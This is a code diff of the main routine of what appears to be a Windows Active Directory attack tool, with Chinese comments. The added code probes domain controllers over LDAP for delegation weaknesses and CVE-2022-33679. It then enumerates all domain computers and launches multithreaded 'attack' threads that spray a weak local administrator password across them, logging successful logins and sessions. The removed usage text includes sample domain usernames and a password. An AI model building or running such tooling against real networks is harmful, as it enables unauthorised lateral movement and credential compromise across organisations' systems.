@@ -12,13 +12,6 @@ int wmain(int argc, wchar_t * argv[])
 
 	setlocale(LC_ALL, "");							// 设置中文
     if (argc != 7) {
-        wprintf(L"Usage: %s <DC-IP> <DC> <domainname\\username> <password> <nbpassword> <t_num>\n", argv[0]);
-		wprintf(L"       %s \\\\域控IP 域控名 域名\\域用户 域用户密码 本地administrator通用密码 多线程数目\n", argv[0]);
-        wprintf(L"       %s \\\\192.168.159.149 Motoo.nc Motoo\\liwei NULL 123456 1\n", argv[0]);
-		wprintf(L"       %s \\\\192.168.159.149 Motoo.nc Motoo\\LiWei-PC$ NULL 123456 1\n", argv[0]);
-		wprintf(L"       %s \\\\192.168.159.149 Motoo.nc Motoo\\liwei lw123!@#45 123456 1\n", argv[0]);
-		wprintf(L"       如果当前用户是域用户，且没有该域用户的密码，则password输入NULL，如果当前用户是域机器的system权限，域用户名为主机名，password输入NULL，如果没有本地administrator通用密码，则nbpassword输入123456\n", argv[0]);
-		
         exit(1);
     }
 
@@ -56,7 +49,7 @@ int wmain(int argc, wchar_t * argv[])
 	{
 		lpDomainUserPassword = NULL;
 	}
-	
+
 
 	// 设置本地非administrator管理员用户的弱口令为123456
 	int iComp = CompareString(GetThreadLocale(), NORM_IGNORECASE, lpNbPassword, lstrlenW(lpNbPassword), L"123456", lstrlenW(L"123456"));
@@ -87,9 +80,9 @@ int wmain(int argc, wchar_t * argv[])
 		exit(0);
 	}
 
-	// 检测委派漏洞（基于资源的约束委派）
+	// 检测委派漏洞（没有密码不跑委派）
 	if (lpDomainUserPassword != NULL){
-		wprintf(L"------------------------------------check delegationVul...------------------------------------\n");
+		wprintf(L"--------    Vul    ------\n\n");
 		LdapApi theLdapApi(lpDCName, (PWCHAR)lpUserName, (PWCHAR)lpDomainUserPassword, hDelegFile);
 		int iConnRet = theLdapApi.connect();
 		if (iConnRet != 1) {
@@ -97,30 +90,36 @@ int wmain(int argc, wchar_t * argv[])
 		}
 		theLdapApi.RBCD();
 		theLdapApi.CD();
+		theLdapApi.CD1();
 		theLdapApi.ud();
+		theLdapApi.ud1();
+		theLdapApi.cve_2022_33679();
 	}
 
+	// 如果当前 nbpassword 为NULL，则，不探测机器，以及弱口令
+	if (CompareString(GetThreadLocale(), NORM_IGNORECASE, lpNbPassword, lstrlenW(lpNbPassword), L"NULL", lstrlenW(L"NULL")) != CSTR_EQUAL)
+	{
+		// 获取域机器列表
+		std::vector<std::wstring> hostnameList;
+		hostnameList = theWNetApi.NetGroupGetUsersApi(lpRemoteName, L"Domain Computers");
 
-	
-	// 获取域机器列表
-	std::vector<std::wstring> hostnameList;
-	hostnameList = theWNetApi.NetGroupGetUsersApi(lpRemoteName, L"Domain Computers");
+		wprintf(L"\n\n--------   start attack   ------\n\n");
 
-	wprintf(L"------------------------------------start attack...------------------------------------\n");
+		multiThread theMultiThread(lpDomainUserName, lpDomainUserPassword, stdPasswordList, hAliveFile, hLocalFile, hSuccessFile, hNetSessionsFile);		// 实例化多线程类
 
-	multiThread theMultiThread(lpDomainUserName, lpDomainUserPassword, stdPasswordList, hAliveFile, hLocalFile, hSuccessFile, hNetSessionsFile);		// 实例化多线程类
-	
-	std::thread * threads = new std::thread[iThreadNum];	// 动态数组
+		std::thread* threads = new std::thread[iThreadNum];	// 动态数组
 
-	for (int i = 0; i < iThreadNum; i++)
-		threads[i] = std::thread(&multiThread::attack, theMultiThread, i, &hostnameList);
+		for (int i = 0; i < iThreadNum; i++)
+			threads[i] = std::thread(&multiThread::attack, theMultiThread, i, &hostnameList);
 
-	for (int i = 0; i < iThreadNum; i++)
-		threads[i].join();
+		for (int i = 0; i < iThreadNum; i++)
+			threads[i].join();
 
-	delete[] threads;
+		delete[] threads;
 
-	finish = clock();												//执行完之后的CPU时间占用值
-	time = (double)(finish - start) / (double)CLOCKS_PER_SEC;		//计算时间，单位换算
-	printf("%lf s\n", time);		//结果
+		finish = clock();												//执行完之后的CPU时间占用值
+		time = (double)(finish - start) / (double)CLOCKS_PER_SEC;		//计算时间，单位换算
+		printf("%lf s\n", time);		//结果
+	}
+		
 }
